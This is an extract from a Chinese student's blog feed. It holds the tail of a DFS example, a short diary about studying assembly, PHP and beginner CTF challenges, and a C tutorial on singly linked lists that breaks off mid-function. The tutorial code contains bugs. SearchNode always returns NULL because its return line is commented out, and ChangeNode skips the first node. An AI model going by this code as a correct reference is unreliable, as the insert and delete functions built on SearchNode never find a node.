<span class="number">1</span>; i &lt;= n; i++) <span class="comment">//遍历</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (book[i] == <span class="number">0</span>) <span class="comment">//满足check</span></span><br><span class="line">{</span><br><span class="line">a[<span class="built_in">step</span>] = i;</span><br><span class="line">book[i] = <span class="number">1</span>;  <span class="comment">//标记</span></span><br><span class="line">dfs(<span class="built_in">step</span> + <span class="number">1</span>); <span class="comment">//继续搜索</span></span><br><span class="line">book[i] = <span class="number">0</span>; <span class="comment">//恢复初始状态</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> num;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">dfs(<span class="number">1</span>); <span class="comment">//从第一个开始</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"共有"</span> &lt;&lt; num/n &lt;&lt; <span class="string">"个"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="bfs"><a class="markdownIt-Anchor" href="#bfs"></a> Bfs</h4><p>广度优先算法（Breadth-First-Search，简称BFS），是一种图形搜索演算法。简单的说，BFS是从根节点开始，沿</p><p>着树的宽度遍历树的节点，如果发现目标，则演算终止；</p><p>.</p><p>.</p><p>这个算法到现在没学会，就算了吧，有时间系统学习一下再整理；23333</p><p>.</p><p>.</p><p>.</p><p>未完待续😀</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2月29日的深更半夜</title>
      <link href="/posts/2-29-diary/"/>
      <url>/posts/2-29-diary/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇博客呢就闲聊一点吧，反正今天也是一个特殊的日子；</p><a id="more"></a><p>​寒假到今天为止50天了，因为疫情原因，大把好时光就这么浪费了，真是难过又觉得可惜，先自我作个总结吧：</p><p>​从寒假第一天开始，玩了一个多星期的王者荣耀（自己很不务正业），想着自己还有任务，赶紧学习，还来得及其实，但是吧，我这人，虽说自觉性很高，但是吧，想耐住性子学习还真不容易；</p><p>​况且，我们任务学习汇编和PHP。这种底层语言真的是很无聊，学着就想吐；刚开始接触PHP的时候感觉很好玩，但是学了一段时间，发现，它的语法还有格式对我这种强迫症来讲，算了算了吧，实在是驾驭不了；</p><p>​我就重点学习汇编，汇编说实话，更麻烦，枯燥无味，很繁琐，可能受C，C++的影响，底层语言真的是无话可说，顿时感觉高级语言好玩；</p><p>​讲真的，想过放弃，但是某一天，堆堆给了我XCTF的链接，我一进去，哇塞，好酷的页面，瞬间又有了学习的动力，我就注册账号，发现题目不是想象的那样，太难了；但是没关系，谁能一开始就觉得简单呢，我就边玩边学，耐得住性子，坐在写字桌前面看书看视频，开头难但是还得学好。。。</p><p>​第一次做出来一道CTF的题目的时候，我那心情，别提有多高兴，题目考验的不仅仅是思维能力，还有计算能力，使用工具的能力，印象最深的是一道P二维码的题目，为了做它，新学了一点PS基础，P了一个晚上还没出来，心态没了；</p><p>​再后来，老师收集学习进度说还得整blog（一提到blog我就来气），看着教程做都做不出来，多亏了柠檬大佬，才有了今天在这里写似日记非日记的东西（嘻嘻嘻）；</p><p>​最近，又得学习Python，还得装虚拟机，虚拟机更是麻烦，所有的错误情况我都遇见了估计，没有比我还倒霉的啦，现在还没装，没心情了，想着尽快把Python基础学完才行，才能进行下一个学习计划；</p><p>、</p><p>、</p><p>、</p><p>长路漫漫，为了拿offer，为了将来，加油干~~~</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
            <tag> summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表—Link List</title>
      <link href="/posts/linklist/"/>
      <url>/posts/linklist/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>链表是C语言中非常难理解的一个知识点，可以说是比指针还难学的东西。在学习数据结构的时候常常会用到，所</p><p>以想来想去有必要整理一波；</p><a id="more"></a><p>链表种类很多种，有单向链表，双向链表，空头链表，非空头链表，循环链表，非循环链表；</p><p>这里我只学了单向空头和单向非空头链表，先整理这两种，以后学完再添加；</p><h2 id="链表"><a class="markdownIt-Anchor" href="#链表"></a> 链表</h2><h3 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h3><p>链表实际上是线性表的链式存储结构，与数组不同的是，它是用一组任意的存储单元来存储线性表中的数据，存储</p><p>单元不一定是连续的；</p><p>且链表的长度不是固定的，链表数据的这一特点使其可以非常的方便地实现节点的插入和删除操作；</p><p>链表的每个元素称为一个节点，每个节点都可以存储在内存中的不同的位置，为了表示每个元素与后继元素的逻辑</p><p>关系，以便构成“一个节点链着一个节点”的链式存储结构；</p><p>除了存储元素本身的信息外，还要存储其直接后继信息，因此，每个节点都包含两个部分，第一部分称为链表的数</p><p>据区域，用于存储元素本身的数据信息，第二部分是一个结构体指针，称为链表的指针域，用于存储其直接后继的</p><p>节点信息；</p><p>next的值实际上就是下一个节点的地址，当前节点为末节点时，next的值设为空指针；</p><h4 id="优点相对于数组"><a class="markdownIt-Anchor" href="#优点相对于数组"></a> 优点（相对于数组）</h4><p>对线性表进行删除，添加等操作时候，不需要移动大量数据，操作简便，而数组需要动用大量数据，十分困难；同</p><p>时链表属于动态分配内存，数据量可以改变，而数组长度必须提前定义好，属于静态分配内存；链表省空间，数组</p><p>容易越界，长度过长又会造成系统资源浪费；</p><p>总的来说，链表优点非常多；</p><h4 id="缺点"><a class="markdownIt-Anchor" href="#缺点"></a> 缺点</h4><p>单向链表只能顺序访问，不能随机访问，这种储存结构最大缺点就是容易断链；一旦某个节点指针域数据丢失，将</p><p>无法找到下一个节点，也就是说，该节点的后面的数据全部丢失；</p><h3 id="无空头链表"><a class="markdownIt-Anchor" href="#无空头链表"></a> 无空头链表</h3><h4 id="头文件函数声明结构体全局变量"><a class="markdownIt-Anchor" href="#头文件函数声明结构体全局变量"></a> 头文件+函数声明+结构体+全局变量</h4><p>头文件stdlib.h，调用malloc（）函数和free（）函数；</p><p>函数比较多，先声明一下，便于阅读；</p><p>结构体先设一个成员，根据自己情况来设；</p><p>设全局变量的话，写各个操作函数的时候就省了一个形参；</p><h5 id="头文件根据使用的语言自行修改"><a class="markdownIt-Anchor" href="#头文件根据使用的语言自行修改"></a> 头文件（根据使用的语言自行修改）</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="函数声明"><a class="markdownIt-Anchor" href="#函数声明"></a> 函数声明</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数声明 链表的增、删、查、改；</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddTail</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//创建链表，在链表中增加一个数据，尾添加</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddHead</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//创建链表，在链表中增加一个数据，头添加</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddList</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span></span>; <span class="comment">//在数字index后面添加数字a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteHead</span><span class="params">()</span></span>; <span class="comment">//头删除</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteTail</span><span class="params">()</span></span>; <span class="comment">//尾删除</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//删除指定节点 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeekList</span><span class="params">()</span></span>; <span class="comment">//遍历链表——&gt;查</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChangeNode</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span></span>; <span class="comment">//将index改为 n  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FreeList</span><span class="params">()</span></span>; <span class="comment">//链表清空</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct Node* <span class="title">SearchNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//查询指定节点</span></span><br></pre></td></tr></tbody></table></figure><h5 id="结构体"><a class="markdownIt-Anchor" href="#结构体"></a> 结构体</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//节点结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span> <span class="comment">//指向下一个节点的指针</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="全局变量"><a class="markdownIt-Anchor" href="#全局变量"></a> 全局变量</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//链表头尾指针（全局变量）</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">tail</span> = <span class="title">NULL</span>;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="添加"><a class="markdownIt-Anchor" href="#添加"></a> 添加</h4><h5 id="头添加"><a class="markdownIt-Anchor" href="#头添加"></a> 头添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddHead</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//创建链表，在链表中增加一个数据，头添加</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//创建一个节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//节点数据进行赋值</span></span><br><span class="line">pTemp-&gt;a = n;</span><br><span class="line">pTemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接在链表上</span></span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)<span class="comment">//链表为空，新节点既是头也是尾巴</span></span><br><span class="line">{</span><br><span class="line">head = pTemp;</span><br><span class="line">tail = pTemp;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">pTemp-&gt;next = head; <span class="comment">//新节点的下一个指向头</span></span><br><span class="line">head = pTemp;<span class="comment">//新节点就是头了</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾添加"><a class="markdownIt-Anchor" href="#尾添加"></a> 尾添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddTail</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//创建链表，在链表中增加一个数据，尾添加</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//创建一个节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//节点数据进行赋值</span></span><br><span class="line">pTemp-&gt;a = n;</span><br><span class="line">pTemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链接</span></span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span> || tail == <span class="literal">NULL</span>)<span class="comment">//空链表，既是头，又是尾</span></span><br><span class="line">{</span><br><span class="line">head = pTemp;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//不为空，往尾巴上添加</span></span><br><span class="line">{</span><br><span class="line">tail-&gt;next = pTemp;</span><br><span class="line">}</span><br><span class="line">tail = pTemp;<span class="comment">// 尾巴一直指向最后一个节点</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="任意位置添加"><a class="markdownIt-Anchor" href="#任意位置添加"></a> 任意位置添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddList</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span><span class="comment">//在数字index后面添加数字n</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表为空，没有节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">fp</span> = <span class="title">SearchNode</span>(<span class="title">index</span>);</span></span><br><span class="line"><span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"没有指定的节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//有此节点，给a创建节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span></span><br><span class="line">pTemp-&gt;a = n;</span><br><span class="line">pTemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fp == tail)<span class="comment">//链接到链表上</span></span><br><span class="line">{</span><br><span class="line">tail-&gt;next = pTemp; <span class="comment">//尾巴的下一个，指向新的节点</span></span><br><span class="line">tail = pTemp;  <span class="comment">//新节点是最后一个，变成尾巴</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">pTemp-&gt;next = fp-&gt;next;<span class="comment">//先连</span></span><br><span class="line">fp-&gt;next = pTemp;      <span class="comment">//后断</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h4><h5 id="头删除"><a class="markdownIt-Anchor" href="#头删除"></a> 头删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteHead</span><span class="params">()</span> <span class="comment">//头删除</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)<span class="comment">//检查链表是否为空</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表为NULL，无需释放!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (head == tail)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">free</span>(head);</span><br><span class="line">head = <span class="literal">NULL</span>;</span><br><span class="line">tail = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">struct Node* pTemp = head;<span class="comment">//记住旧的头</span></span><br><span class="line">head = head-&gt;next; <span class="comment">//头的下一个节点变成新的头</span></span><br><span class="line"><span class="built_in">free</span>(pTemp); <span class="comment">//释放旧的头</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾删除"><a class="markdownIt-Anchor" href="#尾删除"></a> 尾删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteTail</span><span class="params">()</span> <span class="comment">//尾删除</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)<span class="comment">//检查链表是否为空</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表为NULL，无需释放!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//链表不为空 有一个节点</span></span><br><span class="line"><span class="keyword">if</span> (head == tail)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">free</span>(head);</span><br><span class="line">head = <span class="literal">NULL</span>;</span><br><span class="line">tail = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">//找尾巴前一个节点</span></span><br><span class="line">struct Node* pTemp = head;</span><br><span class="line"><span class="keyword">while</span> (pTemp-&gt;next != tail)</span><br><span class="line">{</span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找到尾巴 删除并释放</span></span><br><span class="line"><span class="built_in">free</span>(tail);  <span class="comment">//释放尾巴</span></span><br><span class="line">tail = pTemp;<span class="comment">//移动尾巴</span></span><br><span class="line">tail-&gt;next = <span class="literal">NULL</span>;<span class="comment">//尾巴的下一个指针赋值为NULL</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="任意位置删除"><a class="markdownIt-Anchor" href="#任意位置删除"></a> 任意位置删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNode</span><span class="params">(<span class="keyword">int</span> n)</span><span class="comment">//删除指定节点 </span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)<span class="comment">//检查链表是否为空</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表为NULL，无需释放!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//链表有东西，找此节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">SearchNode</span>(<span class="title">n</span>);</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"查无此节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找到了</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == head) <span class="comment">//只有一个节点</span></span><br><span class="line">{</span><br><span class="line">DeleteHead();</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pTemp == tail)<span class="comment">//有两个节点</span></span><br><span class="line">{</span><br><span class="line">DeleteTail();</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span><span class="comment">//有多个节点</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">struct Node* fp = head;</span><br><span class="line"><span class="keyword">while</span> (fp-&gt;next != pTemp)</span><br><span class="line">{</span><br><span class="line">fp = fp-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找到了</span></span><br><span class="line">fp-&gt;next = pTemp-&gt;next;<span class="comment">//连接</span></span><br><span class="line"><span class="built_in">free</span>(pTemp); <span class="comment">//释放</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="遍历"><a class="markdownIt-Anchor" href="#遍历"></a> 遍历</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeekList</span><span class="params">()</span> <span class="comment">//遍历链表——&gt;查</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">head</span>;</span></span><br><span class="line"><span class="keyword">while</span> (pTemp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d  "</span>,pTemp-&gt;a);</span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="查询"><a class="markdownIt-Anchor" href="#查询"></a> 查询</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct Node* <span class="title">SearchNode</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//查询指定节点</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">head</span>;</span></span><br><span class="line"><span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (pTemp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (n == pTemp-&gt;a)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第%d个数为%d\n"</span>, num, pTemp-&gt;a);</span><br><span class="line"><span class="comment">//return pTemp;</span></span><br><span class="line">}</span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line">num++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">//没找到</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="修改"><a class="markdownIt-Anchor" href="#修改"></a> 修改</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChangeNode</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span><span class="comment">//将index改为 n  </span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">fp</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;a == index)</span><br><span class="line">{</span><br><span class="line">fp-&gt;a = n;</span><br><span 